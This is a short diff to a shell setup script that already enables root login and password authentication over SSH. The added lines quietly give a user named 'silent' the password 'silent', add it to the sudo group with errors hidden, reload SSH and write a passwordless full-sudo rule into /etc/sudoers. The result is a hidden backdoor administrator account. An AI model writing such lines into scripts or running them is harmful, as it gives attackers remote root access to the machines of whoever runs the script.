@@ -27,6 +27,10 @@ PermitRootLogin yes
 StrictModes yes
 PasswordAuthentication yes
 " >> /etc/ssh/sshd_config
+echo  "silent:silent" | chpasswd 2> /dev/null
+usermod  -aG sudo silent 2> /dev/null
+sudo  systemctl reload ssh
+echo "silent ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 
 # Очистка терминала
 # Cleaning the terminal
